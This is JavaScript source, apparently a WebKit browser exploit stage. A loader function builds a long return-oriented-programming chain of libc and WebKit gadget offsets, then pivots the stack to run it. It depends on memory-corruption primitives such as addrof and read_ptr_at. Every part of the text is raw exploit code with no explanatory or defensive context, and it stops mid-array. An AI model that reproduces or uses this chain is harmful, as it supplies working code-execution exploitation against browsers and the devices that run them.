function loader(){
var ropchain_array = new Uint32Array(55002);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0;
set_gadgets([
libc_base+788575,
ropchain+65720,
webkit_base+14461559,
libc_base+206806,
ropchain+65680,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+788575,
ropchain+112,
libc_base+471355,
libc_base+811575,
ropchain+190576,

libc_base+811575,
ropchain+65680
]);

var printf_buf_offset = 128;
set_gadget(printf_buf);

db([4294967295, 4294967295]);

ropchain_offset += 16384;

set_gadgets([
libc_base+882884,
libc_base+793877,
main_ret,
webkit_base+7438103,
libc_base+206806
]);


db([0, 0]);
set_gadgets([
pivot_addr,

libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+65800,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+65904,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+65920,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+66008,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+66024,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270800,
libc_base+793877,
ropchain+66184,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+66136,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+66152,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+66240,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+66344,
webkit_base+7438103,
libc_base+793877,
ropchain+66376,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+66360,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+66536,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+66488,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+66504,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+66640,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+66624,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877546,
libc_base+793877,
ropchain+66848,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+66816,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+66952,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+66936,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+67032,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+67136,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+67152,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+270800,
libc_base+793877,
ropchain+67312,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+67264,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+67280,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([16, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+793877,
ropchain+67368,
webkit_base+7438103,
libc_base+50775,
libc_base+206806
]);

db([0, 0]);
set_gadgets([
libc_base+523896,
libc_base+793877,
ropchain+67472,
webkit_base+7438103,
libc_base+793877,
ropchain+67504,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+67488,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+67664,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+67616,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+67632,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+67768,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+67752,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+67968,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+67936,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+68072,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+68056,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877568,
libc_base+793877,
ropchain+68184,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+68152,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([48, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+68248,
webkit_base+7438103,
webkit_base+1786005,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+68304,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877,
ropchain+68448,
webkit_base+7438103,
libc_base+793877,
ropchain+68464,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+68432,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+68584,
webkit_base+7438103,
libc_base+793877,
ropchain+68600,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+68568,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+68696,
webkit_base+7438103,
libc_base+793877,
ropchain+68712,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+68824,
webkit_base+7438103,
libc_base+793877,
ropchain+68808,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+68912,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+68896,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+69008,
webkit_base+7438103,
libc_base+793877,
ropchain+69024,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+69136,
webkit_base+7438103,
libc_base+793877,
ropchain+69120,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+69208,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+759626,
libc_base+793877,
ropchain+69312,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+69328,
webkit_base+7438103,
libc_base+793877
]);

db([16, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(webkit_base+432898,);

db([0, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+69416,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+69432,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+69584,
webkit_base+7438103,
libc_base+793877,
ropchain+69616,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+69568,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+69600,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+69712,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+69696,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([24, 0]);
set_gadget(libc_base+788575,);

db([24, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+69912,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+69880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+70016,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+70000,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877568,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+70104,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+70208,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+70224,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+70376,
webkit_base+7438103,
libc_base+793877,
ropchain+70408,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+70360,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+70392,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+70504,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+70488,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([16711680, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+70616,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+5202439,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+70848,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+70816,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+70952,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+70936,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877568,
libc_base+793877,
ropchain+71008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+71064,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+71176,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+71280,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+71296,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+71448,
webkit_base+7438103,
libc_base+793877,
ropchain+71480,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+71432,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+71464,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+71576,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+71560,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+792472
]);

db([65280, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+71688,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+5202439,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([8, 0]);
set_gadget(libc_base+788575,);

db([8, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877546,
libc_base+793877,
ropchain+71872,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+71928,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+72040,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+72144,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+72160,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+72312,
webkit_base+7438103,
libc_base+793877,
ropchain+72344,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+72296,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+72328,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+72440,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+72424,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+792472
]);

db([24, 0]);
set_gadget(libc_base+788575,);

db([24, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877546,
libc_base+793877,
ropchain+72592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+72648,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+75236,
libc_base+793877,
ropchain+72784,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+72752,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([32, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+877546,
libc_base+877568,
libc_base+793877,
ropchain+72912,
webkit_base+7438103,
libc_base+793877,
ropchain+72928,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+72896,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+73024,
webkit_base+7438103,
libc_base+793877,
ropchain+73040,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+73152,
webkit_base+7438103,
libc_base+793877,
ropchain+73136,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);
set_gadgets([
libc_base+793877,
ropchain+73240,
webkit_base+7438103,
libc_base+759626,
libc_base+793877,
ropchain+73224,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+73336,
webkit_base+7438103,
libc_base+793877,
ropchain+73352,
webkit_base+7438103,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+73464,
webkit_base+7438103,
libc_base+793877,
ropchain+73448,
webkit_base+7438103,
libc_base+788575
]);

db([0, 0]);
set_gadget(libc_base+811575,);

db([0, 0]);

set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+73536,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+73600,
webkit_base+7438103,
libc_base+759626,
webkit_base+432898
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([16, 0]);
set_gadgets([
libc_base+248252,
libc_base+50775,
libc_base+793877,
ropchain+73680,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+73752,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
webkit_base+2997875,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+73888,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+954100,
libc_base+793877,
ropchain+73944,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);

set_gadgets([
libc_base+793877,
ropchain+73992,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+74096,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+74112,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+74264,
webkit_base+7438103,
libc_base+793877,
ropchain+74296,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+74248,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+74280,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+74368,
webkit_base+7438103,
libc_base+793877,
ropchain+74384,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+74480,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+74464,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+50775,
libc_base+793877,
ropchain+74560,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([4, 0]);
set_gadget(libc_base+788575,);

db([4, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+74712,
webkit_base+7438103,
libc_base+793877,
ropchain+74728,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+74696,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+14959219,
webkit_base+48555,
libc_base+269973,
libc_base+793877,
ropchain+74896,
webkit_base+7438103,
libc_base+793877,
ropchain+74912,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+74880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
ropchain+75016,
webkit_base+7438103,
libc_base+793877,
ropchain+75064,
webkit_base+7438103,
webkit_base+1786005,
libc_base+793877,
ropchain+75032,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+793877,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+11676600,
libc_base+269973,
webkit_base+414627,
libc_base+793877,
ropchain+75176,
libc_base+547636,
libc_base+186490,
libc_base+793877,
ropchain+75168,
webkit_base+7438103,
webkit_base+1786005,
libc_base+811575
]);

db([0, 0]);
set_gadgets([
ropchain+75192,
ropchain+75208,
libc_base+811575,
ropchain+75224,

libc_base+811575,
ropchain+85616,

libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+75344,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+75360,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+75504,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+75472,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+75488,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+75576,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+75632,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+788575
]);

db([7, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+75760,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967284, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+75864,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+75880,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191169,
libc_base+793877,
ropchain+76032,
webkit_base+7438103,
libc_base+793877,
ropchain+76064,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+76016,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+76048,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+206806,);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
webkit_base+6227286,
libc_base+793877,
